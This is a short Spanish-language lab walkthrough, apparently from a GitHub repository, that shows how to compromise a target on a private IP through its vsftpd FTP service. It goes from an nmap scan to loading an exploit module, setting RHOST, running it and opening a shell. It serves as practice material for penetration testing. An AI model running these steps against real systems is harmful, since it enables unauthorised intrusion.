# Vulneración mediante el servicio FTP

No podemos iniciar a trabajar sin saber que tenemos alcance, por eso realizaremos un análisis de sus puertos y de los servicios que están disponibles.  
Para esto nos apoyaremos de la herramienta `nmap` con el siguiente comando:

```bash
nmap -sV 192.168.222.131 
```

![Escaneo de puertos con Nmap](https://github.com/user-attachments/assets/08d5d404-3bf6-40b6-aaba-69b70e00629e)

Se visualiza que el puerto 21 ofrece un servicio de FTP. Para esto, realizaremos una búsqueda filtrada con la palabra clave **"vsftpd"**.

![Búsqueda de exploit para vsftpd](https://github.com/user-attachments/assets/f8dd4e3b-1012-4933-81d1-5745e20061ad)

Verificamos qué requisitos nos solicita este exploit para poder ejecutarlo, con el comando:

```bash
show options
```

![Opciones del exploit](https://github.com/user-attachments/assets/bd05d79b-cb1c-4351-a62b-1b2a2a033f17)

Se denota que nos hace falta ingresar el **RHOST**, lo cual sería la dirección de nuestra máquina objetivo:

```bash
set RHOST 192.168.222.131
```

![Estableciendo el RHOST](https://github.com/user-attachments/assets/c43872ea-942a-468e-8a15-cf547573be03)

Ejecutamos con el comando:

```bash
run
```

![Ejecución del exploit](https://github.com/user-attachments/assets/2701e9ae-4e27-42fa-a6ea-0bdb4c6a60c8)

Ingresamos el comando `shell` para que la interfaz de escritura sea parecida a la de nuestra máquina principal:

```bash
shell
```

![Acceso a shell](https://github.com/user-attachments/assets/1b94e196-88b3-4214-9324-067df3a14d03)
